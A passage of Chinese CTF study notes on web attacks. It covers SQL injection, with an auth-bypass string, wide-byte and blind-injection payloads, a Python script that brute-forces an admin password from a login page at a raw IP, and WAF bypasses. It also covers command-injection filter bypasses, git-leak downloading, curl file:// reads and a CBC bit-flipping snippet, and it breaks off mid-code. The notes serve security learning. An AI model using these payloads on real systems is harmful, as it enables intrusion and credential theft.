  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select *,if(mark&gt;&#x3D;60, &#39;PASS&#39;, &#39;NOPE&#39;) from grades;</span><br><span class="line">        #+------+------+------------------------------+</span><br><span class="line">        #| Name | mark | if(mark&gt;&#x3D;60, &#39;PASS&#39;, &#39;NOPE&#39;) |</span><br><span class="line">        #+------+------+------------------------------+</span><br><span class="line">        #| Tom  |   95 | PASS                         |</span><br><span class="line">        #| Jill |   92 | PASS                         |</span><br><span class="line">        #| Neo  |   59 | NOPE                         |</span><br><span class="line">        #| Alan |   76 | PASS                         |</span><br><span class="line">        #+------+------+------------------------------+</span><br></pre></td></tr></table></figure></li>
<li><p><code>SUBSTR / MID(str,start,length)</code>：start为起点；length为截取长度，length可选择不填</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select substr(passwd,1,3) from users;</span><br><span class="line">        #+--------------------+</span><br><span class="line">        #| substr(passwd,1,3) |</span><br><span class="line">        #+--------------------+</span><br><span class="line">        #| kyr                |</span><br><span class="line">        #| 0te                |</span><br><span class="line">        #| 233                |</span><br><span class="line">        #| adp                |</span><br><span class="line">        #| Doc                |</span><br><span class="line">        #| Doc                |</span><br><span class="line">        #| Doc                |</span><br><span class="line">        #+--------------------+</span><br></pre></td></tr></table></figure></li>
<li><p><code>SUBSTR / MID((col)from(start))</code>：这种表达很关键的一点在于 ※ 不需要逗号 ※</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select mid((passwd)from(3)) from users;</span><br><span class="line">		#+----------------------+</span><br><span class="line">		#| mid((passwd)from(3)) |</span><br><span class="line">		#+----------------------+</span><br><span class="line">		#| riotayyds            |</span><br><span class="line">		#| est                  |</span><br><span class="line">		#| 3test                |</span><br><span class="line">		#| passwd               |</span><br><span class="line">		#| ctor                 |</span><br><span class="line">		#| ctor                 |</span><br><span class="line">		#| ctor                 |</span><br><span class="line">		#+----------------------+</span><br></pre></td></tr></table></figure></li>
<li><p><code>MD5()</code>：SQL也内置了 md5加密函数</p>
</li>
<li><p><code>SLEEP()</code>：延迟函数，单位为秒</p>
</li>
</ul>
<h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><big>information_schema</big></h2><p>信息数据库，保存着关于mysql服务器所维护的所有其他数据库的信息，该数据库中又有几个重要的数据表，而当需要跨数据库访问时，则与类成员的访问相似，如对于COLUMNS：information_schema.COLUMNS</p>
<ul>
<li><p>SCHEMATA：提供了当前mysql实例中所有数据库的信息</p>
<ul>
<li>SCHEMA_NAME这一列记录着所有数据库名</li>
</ul>
</li>
<li><p>TABLES：提供了当前数据库中的表的信息，表类型，表引擎，所属的数据库，创建时间等信息</p>
<ul>
<li>TABLE_NAME：数据表名</li>
<li>TABLE_SCHEMA：表对应的数据库名</li>
</ul>
</li>
<li><p>COLUMNS：提供了表中列的信息，详细表述所有列的信息</p>
<ul>
<li><p>TABLE_SCHEMA：数据库名</p>
</li>
<li><p>TABLE_NAME：表名</p>
</li>
<li><p>COLUMN_NAME：列名</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select * from columns where table_name&#x3D;&#39;users&#39;;</span><br><span class="line">        #+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+--------------------+-------------+------------+-------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">        #| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME | COLUMN_NAME         | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME     | COLUMN_TYPE | COLUMN_KEY | EXTRA | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION | SRS_ID |</span><br><span class="line">        #+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+--------------------+-------------+------------+-------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">        #| def           | performance_schema | users      | CURRENT_CONNECTIONS |                2 | NULL           | NO          | bigint    |                     NULL |                   NULL |                19 |             0 |               NULL | NULL               | NULL               | bigint      |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | performance_schema | users      | TOTAL_CONNECTIONS   |                3 | NULL           | NO          | bigint    |                     NULL |                   NULL |                19 |             0 |               NULL | NULL               | NULL               | bigint      |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | performance_schema | users      | USER                |                1 | NULL           | YES         | char      |                       32 |                    128 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_bin        | char(32)    | UNI        |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | test               | users      | passwd              |                2 | NULL           | YES         | varchar   |                       12 |                     48 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_0900_ai_ci | varchar(12) |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | test               | users      | uname               |                1 | NULL           | YES         | varchar   |                       10 |                     40 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_0900_ai_ci | varchar(10) |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+--------------------+-------------+------------+-------+---------------------------------+----------------+-----------------------+--------+</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="基于约束的攻击"><a href="#基于约束的攻击" class="headerlink" title="基于约束的攻击"></a><big>基于约束的攻击</big></h2><blockquote>在MySQL的配置选项中，有一个sql_mode选项。当MySQL的sql_mode设置为default时，即没有开启STRICT_ALL_TABLES选项时，MySQL对于用户插入的超长值只会提示warning，而不是error（如果是error则插入不成功），这可能会导致发生一些“截断”问题 ———— 道哥</blockquote>

<p>因为在sql执行字符串处理时，字符串末尾的空格符将会被删除，导致 “admin”与 “admin     ”是等效的。当使用如 “admin                       x”这样的超长字符串，或末尾直接是空格的“admin   ”注册成功，前者会因为截断，和后者一样可以达到越权获取权限</p>
<h2 id="SQL查询与比较"><a href="#SQL查询与比较" class="headerlink" title="SQL查询与比较"></a><big>SQL查询与比较</big></h2><p>str与int的比较：与PHP一样，非数字开头的str被当成 0，数字开头的会被当成那个开头的数字，这使得在输入 user=0或 user=’’时返回所有非 0开头的 user</p>
<p>SQL连等：阴间语法，如 where user=’admin’=’admin’=1，可理解为做异或取反 (同或)运算</p>
<blockquote>查第一个admin，查询对象是原本的数据表，结果为{admin：1，其他：0}
    此时还没有到返回admin并打印出来的时候，因为后面的连等还没有比较完</blockquote>

<blockquote>查第二个admin，查询对象是1和0，因为admin非数字开头，此时和int比较，转换成0，和上次非admin的字段的查询结果匹配，所以这次比较结果为{admin：0，其他：1}</blockquote>

<blockquote>第三次查1，显然匹配到其他，故最终返回为处admin外的所有成员</blockquote>

<h2 id="万-能-钥-匙"><a href="#万-能-钥-匙" class="headerlink" title="万 能 钥 匙"></a><big>万 能 钥 匙</big></h2><p>最基础的SQL注入：admin’ or ‘1’=’1</p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a><big>宽字节注入</big></h2><p align='right'><small>特征：gbk等宽字节编码</small></p>

<p>通常的在sql语句前面使用了一个addslashes()，将$id的值转义。这是通常对sql注入进行的操作，只要我们的输入参数在单引号中，就逃逸不出单引号的限制，无法注入</p>
<p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前提是前一个ASCII码大于128，这样才能达到汉字的范围，如%df之类的）</p>
<p>示例payload：<code>/?id=hello%df' union select 'admin','pass'#</code></p>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a><big>盲注</big></h2><p align='right'><small>SQLI-LAB</small></p>

<p>对无回显页面的注入叫做盲注，大多数时候都是遇见的这样的页面，分为布尔盲注和时间盲注，但本质上差别不大。原理大致可理解为不断猜测字符的过程，通过注入后返回的信息判断猜对与否，有点暴力破解的意思。由于盲注的重复性，手注在盲注中最多用于盲注类型的判断，猜测过程则交给脚本，burp，sqlmap等完成</p>
<p>通常盲注时先跑数据库名的长度，再跑数据库名，然后又跑表名的长度…如果有需要甚至可爆整个数据库，也可以不跑长度而直接开始跑内容，因为知道长度的作用只是心里有个底。布尔盲注和时间盲注的区别就只是在于返回信息不同，布尔盲注通过返回两种状态信息判断，时间盲注则根据响应时间判断</p>
<ul>
<li><p>payload构造与示例</p>
<p>构造payload时，应根据网页实现的功能考虑使用了什么SQL查询语句，这样才能准确知道需要多少括号或引号来闭合语句</p>
<ul>
<li><p>表长（包含在INSERT INTO … VALUE(input)中）：<code>'and (case when (length((select group_concat(table_name separator '-') from information_schema.tables where table_schema=database()))=10) then sleep(5) else 1 end)) #</code></p>
<p>  可以发现结尾因为要注释掉多余的 <code>')</code> 而补了一个反括号</p>
</li>
<li><p>表名：<code>if(substr((select group_concat(table_name separator ',') from information_schema.tables where table_schema=database())  from %s for 1)='%s',sleep(5),1)</code></p>
</li>
<li><p>字段名：<code>ascii(mid((select group_concat(column_name separator '-') from information_schema.columns where table_name='表名') from(%i)))=%i</code></p>
</li>
</ul>
</li>
<li><p>e.g.布尔盲注猜admin密码</p>
<ul>
<li><p>如返回“用户名不存在”与“密码错误”两种信息的页面，就可以尝试布尔盲注</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">url=<span class="string">&#x27;http://114.67.246.176:13058/login.php&#x27;</span><span class="comment">#注意是登录页而非index</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):<span class="comment">#猜测是MD5加密，为32位，先跑33位试试</span></span><br><span class="line">    <span class="keyword">for</span> tar <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):<span class="comment">#32~128为常用的96个ASCII字符</span></span><br><span class="line">        uname=<span class="string">&quot;admin&#x27;=&#x27;admin&#x27;=ascii(mid((passwd)from(%s)))-%s-&#x27;&quot;</span>%(i,tar)</span><br><span class="line">        data=&#123;<span class="string">&#x27;uname&#x27;</span>:uname,<span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;anything&#x27;</span>&#125;</span><br><span class="line">        response=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> response:<span class="comment">#报密码错误时说明tar的值与密码第i位字符的ASCII相同</span></span><br><span class="line">            result+=<span class="built_in">chr</span>(tar)</span><br><span class="line">            print(<span class="string">&quot;\r%s&quot;</span>%result,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li>
<li><p>上述脚本不是绝对的，有的登录页可能对某些注入方式设置了针对性过滤，具体的payload构造还需要对应具体情况，此处再举一个“=”被过滤的例子</p>
  <center><code>"admin'^((ascii(mid((select(password)from(admin))from(%s))))<>%s)^1#"</code></center></li>
</ul>
</li>
</ul>
<h2 id="预处理语句"><a href="#预处理语句" class="headerlink" title="预处理语句"></a><big>预处理语句</big></h2><p>所谓预处理指的就是将SQL语句中的关键字(如 SELECT…FROM…)与数据(如字段名，数据表名)分离,使得针对不同数据的相同SQL语句的执行开销更小，同时又可防止SQL注入的攻击</p>
<p>传统方式的SQL语句，在执行时每条SQL都需要经过分析、编译和优化的步骤；预处理方式则是利用客户端与服务器的二进制协议，预先编译一次客户端发送的SQL语句模板,然后再根据客户端发送给服务器相应数量的变量进行执行操作，并旦针对一条SQL语句模板可以执行多次,还无需考虑数据中含有未转义的SQI引号和分隔符字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt FROM &#39;SELECT * FROM user WHERE uname&#x3D;?&#39;;</span><br><span class="line">SET @uname&#x3D;&#39;admin&#39;;</span><br><span class="line">EXECUTE stmt USING @uname;</span><br><span class="line">DEALLOCATE &#x2F; DROP PREPARE stmt;</span><br></pre></td></tr></table></figure>

<p>以此，可以在能堆叠注入时候绕过对SELECT等关键字的过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET @sqlvar&#x3D;CONCAT(&#39;SE&#39;,&#39;LECT * FROM user&#39;);</span><br><span class="line">PREPARE myquery FROM @sqlvar;</span><br><span class="line">EXECUTE myquery;</span><br></pre></td></tr></table></figure>

<h2 id="❀花式绕过❀"><a href="#❀花式绕过❀" class="headerlink" title="❀花式绕过❀"></a><big>❀花式绕过❀</big></h2><ul>
<li><p>双写关键字：某些简单的waf中，将关键字<code>select</code>等只使用<code>replace()</code>函数置换为空，这时候可以使用双写关键字绕过。例如<code>select</code>变成<code>seleselectct</code>，在经waf的处理之后又变成<code>select</code>，达到绕过的要求</p>
</li>
<li><p>过滤select：当存在回显时，可以基于报错注入。常用函数为两个操作XML文档的函数</p>
<ul>
<li><code>extractvalue()</code>：对XML文档进行查询的函数<ul>
<li>para：(目标xml文档，xml路径)</li>
</ul>
</li>
<li><code>updatexml()</code>：更新xml文档<ul>
<li>para：(目标xml文档，xml路径，更新的内容)</li>
</ul>
</li>
</ul>
<p>  通过将正常的XML路径修改为不符合语法的路径即可使其报错并显示错误内容，如下面这则查询：</p>
<p>  <code>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))</code></p>
<p>  会返回：<code>error 1105 : XPATH syntax error: &#39;~database_name&#39;</code>，即 <code>~</code> 与库名组成的字段</p>
</li>
<li><p>过滤引号：转hex，如admin =&gt; hex{61 64 6d 69 6e}</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from users where uname &#x3D; 0x61646d696e;</span><br><span class="line">        #+-------+----------+</span><br><span class="line">        #| uname | passwd   |</span><br><span class="line">        #+-------+----------+</span><br><span class="line">        #| admin | adpasswd |</span><br><span class="line">        #+-------+----------+</span><br></pre></td></tr></table></figure></li>
<li><p>过滤空格：<code>/**/</code>，<code>()</code>，<code>%0a</code>，<code>`</code></p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users;</span><br><span class="line">select(id)from(users);#注意*不能在空格内</span><br><span class="line">select&#96;id&#96;from&#96;users&#96;where&#96;id&#96;&#x3D;1;</span><br></pre></td></tr></table></figure></li>
<li><p>过滤逻辑运算符：<code>and = &amp;&amp;</code>，<code>or = ||</code>，<code>xor = |</code>，<code>not = !</code></p>
</li>
<li><p>过滤等号：</p>
<ul>
<li><p><code>like</code>：不加通配符%的like与等于等效</p>
  <center><code>select * from users where uname like 'admin';</code></center></li>
<li><p><code>rlike</code>：模糊匹配，搜索字段中存在的部分，则所有包含搜索内容的字段均会被选中</p>
  <center><code>select * from users where uname rlike 'admin';</code></center></li>
<li><p><code>regexp</code>：正则匹配</p>
  <center><code>select * from users where uname regexp 'admin';</code></center></li>
<li><p>夹逼：</p>
  <center><code>select * from users where id>0 and id<2;</code></center></li>
<li><p><code>!(...&lt;&gt;...)</code>：双重否定表肯定</p>
  <center><code>select * from users where !(uname<>'admin');</code></center></li>
<li><p>strcmp(str1,str2)：字符串相同返回0，不同返回1或-1</p>
</li>
</ul>
  <center><code>strcmp(ascii(substr(uname,1,1)),100)</code></center>

<ul>
<li>in：</li>
</ul>
  <center><code>substr(username,1,1) in ('a')</code></center>

<ul>
<li>between … and …：</li>
</ul>
  <center><code>substr(username,1,1) between 'a' and 'a'</code></center></li>
<li><p>过滤逗号：</p>
<ul>
<li><p>对于substr()，mid()等字符处理函数可用<code>from pos for len</code>：从<code>pos</code>开始读<code>len</code>个字符，用法为<code>substr(&#39;HelloWorld&#39; from 2 for 5)</code></p>
</li>
<li><p>对于需要<code>union select</code>到的派生表，可以用<code>join</code>代替逗号来隔开；注意派生表需要对其定义一个临时表名</p>
  <center><code>select 1，2，3;</code></center>

  <center>等价于</center>

  <center><code>select * from (select 1)a join (select 2)b join(select 3)c;</code></center></li>
</ul>
</li>
<li><p>过滤部分函数：</p>
<ul>
<li><p>sleep() –&gt;benchmark()：benchmark()用于测试某些特定操作的执行速度，第一个参数是执行次数，第二个是执行的表达式</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select 1 and benchmark(500000000,1);</span><br><span class="line">        #+------------------------------+</span><br><span class="line">        #| 1 and benchmark(500000000,1) |</span><br><span class="line">        #+------------------------------+</span><br><span class="line">        #|                            0 |</span><br><span class="line">        #+------------------------------+</span><br><span class="line">        #1 row in set (1.49 sec)</span><br></pre></td></tr></table></figure></li>
<li><p>ascii()–&gt;hex()、bin()</p>
</li>
<li><p>group_concat()–&gt;concat_ws()</p>
</li>
<li><p>ascii()–&gt;ord()：这两个函数在处理英文时效果一样，但是处理中文等时不一致</p>
</li>
</ul>
</li>
</ul>
<hr>
<h1 id="web框架"><a href="#web框架" class="headerlink" title="web框架"></a><big><center>web框架</center></big></h1><h2 id="python框架"><a href="#python框架" class="headerlink" title="python框架"></a>python框架</h2><p><code>os.environ</code>：python的环境变量，可能会在里面隐藏信息，本体是一个文件，绝对地址为 <code>/proc/self/environ</code></p>
<p><code>pickle</code>：用于序列化的库，序列化：<code>pickle.dumps(obj)</code>，反序列化：<code>pickle.loads(str)</code>（直接dump、load，即不加 s 时，是将序列化后的文本储存到文件中）</p>
<h3 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h3><h3 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h3><h2 id="PHP框架"><a href="#PHP框架" class="headerlink" title="PHP框架"></a>PHP框架</h2><h3 id="FatFreeFramework"><a href="#FatFreeFramework" class="headerlink" title="FatFreeFramework"></a>FatFreeFramework</h3><hr>
<h1 id="git"><a href="#git" class="headerlink" title="git"></a><big><center>git</center></big></h1><h2 id="git基础"><a href="#git基础" class="headerlink" title="git基础"></a><big>git基础</big></h2><p>HEAD：指向你正在工作中的本地分支的指针，可以将HEAD想象为当前分支的别名</p>
<p>git reflog：查看引用日志，记录分支和HEAD指向的历史，这些日志可以被删除，并非硬性</p>
<p>CommitID：reflog中会记录提交 ID，作为reset的参数可以退回到指定的提交处</p>
<p>git checkout – file_path_name：用于放弃单个文件的修改，注意 –两边有空格</p>
<p>git reset [–hard|soft|mixed|merge|keep] [commit|HEAD]：将当前分支重设到指定的</p>
<p>HEAD^：退回一个快照，^数量表示退回的步数</p>
<p>git status [-s]：命令用于查看在你上次提交之后是否有对文件进行再次修改，-s表简短</p>
<p><img src="/images/git%E6%8C%87%E4%BB%A4%E5%8F%AF%E8%A7%86%E5%8C%96.png"></p>
<center style="color:#C0C0C0;text-decoration:underline">对应的Git流程区域分别为    工作区 / 缓存区 / 提交历史</center>

<h2 id="git泄漏"><a href="#git泄漏" class="headerlink" title="git泄漏"></a><big>git泄漏</big></h2><p>在网页更新，上传过程中由于操作失误可能导致 git泄漏</p>
<p>特征：/.git可以访问，或遗留了 .swp，.php.bak，.php~ 等备份文件</p>
<p>对于 /.git可以访问的页面，尝试用 GitHack或 Linux中 wget命令下载 .git文件夹</p>
<p>GitHack依赖Python2.7环境：<code>python2 githack.py address/.git/</code></p>
<p>-r参数为递归下载，整站爬取：<code>wget -r address/.git</code></p>
<hr>
<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><big><center>Linux</center></big></h1><h2 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a><big>Linux基础</big></h2><p>pwd：显示当前目录</p>
<p>dir 与 ls：显示指定目录内容，默认为当前目录</p>
<p>wget：下载命令，其中 -r参数为递归下载，相当于整站下载</p>
<p>浏览文件：</p>
<ul>
<li><p>cat：连接文件并打印</p>
</li>
<li><p>tac：连接文件，倒序打印</p>
</li>
<li><p>nl：链接文件并带行号打印</p>
</li>
<li><p>head：连接文件，打印开头几行</p>
</li>
<li><p>tail：连接文件，打印最后几行</p>
</li>
<li><p>more：逐页显示内容，便于阅读，自带 +/string 搜索功能，当 string 是 int 时会从那一行开始显示</p>
</li>
<li><p>less：目前理解为更高级的 more</p>
</li>
</ul>
<p>chmod u+x：提升文件权限，当出现 zsh permission 权限低时可用</p>
<p>grep：查找文件里符合条件的字符串（可正则），全称 Global Regular Expression Print，可直接对文件内容进行搜索，如在’/usr/src/Linux/Doc’目录下搜索带字符 串’magic’的文件：<code>grep magic /usr/src/Linux/Doc/*</code></p>
<p>../ 与 ./：父级目录与当前目录</p>
<p>&gt;：重定向输出，覆盖原有内容，<code>echo 'this is flag' > flag.txt</code> #若flag.txt不存在，则创建；若存在，则覆盖</p>
<p>&gt;&gt;：重定向输出，追加新内容</p>
<p>&lt;：从文件中获取输入</p>
<p>|：管道 (pipe)，以上一条命令的输出作为下一条命令的参数或输入</p>
<p>||：上一条命令执行失败后才执行下一条命令</p>
<p>&amp;&amp;：上一条命令执行成功后才执行下一条命令</p>
<p>?：通配符，匹配任意单个字符</p>
<p>$：声明变量</p>
<h2 id="❀花式catFlag❀"><a href="#❀花式catFlag❀" class="headerlink" title="❀花式catFlag❀"></a><big>❀花式catFlag❀</big></h2><ul>
<li><p>过滤空格：<code>\&lt;</code>，<code>\&gt;</code>，<code>\&lt;/</code>，<code>&#123; , &#125;</code>，<code>\$&#123;IFS&#125;</code>，<code>\$IFS\$1</code> - [数字随意]</p>
  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;flag.txt</span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">IFS<span class="variable">$9flag</span>.txt</span></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>堆叠：当只有一个语句的时候，末尾无需分号，最后一个语句后面也无需分号</p>
</li>
<li><p>变量拼接 [前提是可以堆叠]：如下列代码对<code>flag</code>贪婪匹配</p>
  <center><code>preg_match("/.*f.*l.*a.*g.*/", $input)</code></center>

  <center>对 ↓ 策</center>

  <center><code>$input：a=ag;b=fl;cat $b$a</code></center></li>
<li><p>sh命令执行：<code>echo YourShell|sh</code></p>
</li>
<li><p>b64编码：<code>echo YourB64|base64 -d</code></p>
</li>
<li><p>命令替换：反引号 <code>``</code> 框选的内容在命令中优先执行，执行结果返回到原本反引号的位置进行替换，例如<code>cat &#96;ls&#96;</code>会先 ls，返回当前目录下所有文件名，然后 cat 会把所有文件逐一连接、打印</p>
</li>
</ul>
<hr>
<h1 id="Tool"><a href="#Tool" class="headerlink" title="Tool"></a><big><center>Tool</center></big></h1><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a><big>sqlmap</big></h2><p>全自动 SQL扫描工具，<code>--batch</code> 一键开启全自动模式</p>
<ul>
<li>注入检测<ul>
<li><code>-u url</code>——检查GET参数注入点</li>
<li><code>-u url -data="id=1"</code>——检查POST参数注入点</li>
<li><code>-u url -H 'header=*'</code>——检查HEADER注入，星号表示手动标记注入点</li>
</ul>
</li>
<li>表单爆破<ul>
<li><code>-dbs</code>——查看数据库</li>
<li><code>-D database_name --tables</code>——查看表名</li>
<li><code>-D database_name -T table_name --columns</code>——查看列名</li>
<li><code>-D database_name -T table_name -C col1,col2... --dump</code>——查看列内容</li>
</ul>
</li>
</ul>
<h2 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a><big>cURL</big></h2><p>利用 URL语法在命令行下工作的文件传输工具，Windows自带，GET，POST，HEADERS等 curl都支持，和python中的requests差不多<code>curl baidu.com</code>，详情可以 curl –help</p>
<p>也可以访问本地文件：<code>curl file:///MyPhoto.png</code></p>
<p>还可以一行命令，多个访问：<code>curl baidu.com google.com</code></p>
<p>当服务端自身使用 curl发送 GET请求，且 GET内容可控时，可以获取服务端本地 flag</p>
<p>服务端的情况：<code>curl address.com/?key=$_GET['key']</code></p>
<p>利用多个访问与本地访问，传参为：<code>server.com/?key=anything file:///flag</code></p>
<h2 id="pip指定版本的包"><a href="#pip指定版本的包" class="headerlink" title="pip指定版本的包"></a><big>pip指定版本的包</big></h2><p><code>pip install lib==version</code></p>
<hr>
<h1 id="ENCRYPT"><a href="#ENCRYPT" class="headerlink" title="ENCRYPT"></a><big><center>ENCRYPT</center></big></h1><h2 id="CBC字符翻转攻击"><a href="#CBC字符翻转攻击" class="headerlink" title="CBC字符翻转攻击"></a><big>CBC字符翻转攻击</big></h2><p align='right'><small>还不太懂，暂先收录</small></p>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&depth_1-utm_source=distribute.pc_relevant.no">CSDN相关文章</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">#计算cipher</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	明文1：a:2:&#123;s:8:&quot;userna		//r</span></span><br><span class="line"><span class="comment">	明文2：me&quot;;s:5:&quot;admil&quot;;		//l字母在第14个字节</span></span><br><span class="line"><span class="comment">	明文3：s:8:&quot;password&quot;;s</span></span><br><span class="line"><span class="comment">	明文4：:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$cipher</span>=base64_decode(urldecode(<span class="string">&#x27;f0csYAAWDy%2FGlSsvWLr6NlCBad4p2U%2BXm2Rr2X07iytKd4r8V5tbO7%2FcxIib96eRDGUOMQclQgvxw2SZXOobWQ%3D%3D&#x27;</span>));</span><br><span class="line"><span class="variable">$temp</span>=<span class="variable">$cipher</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	设密文1[13]=A,	解密(密文2)[13]=B,	明文2[13]=C,	</span></span><br><span class="line"><span class="comment">	将A修改为A ^ C,则:</span></span><br><span class="line"><span class="comment">	A ^ B = A ^ C ^ B = B ^ B = 0 = C</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"><span class="comment">//						A				  C			 X</span></span><br><span class="line"><span class="variable">$cipher</span>[<span class="number">13</span>]=chr(ord(<span class="variable">$cipher</span>[<span class="number">13</span>]) ^ ord(<span class="string">&#x27;l&#x27;</span>) ^ ord(<span class="string">&#x27;n&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(<span class="variable">$cipher</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算iv</span></span><br><span class="line"><span 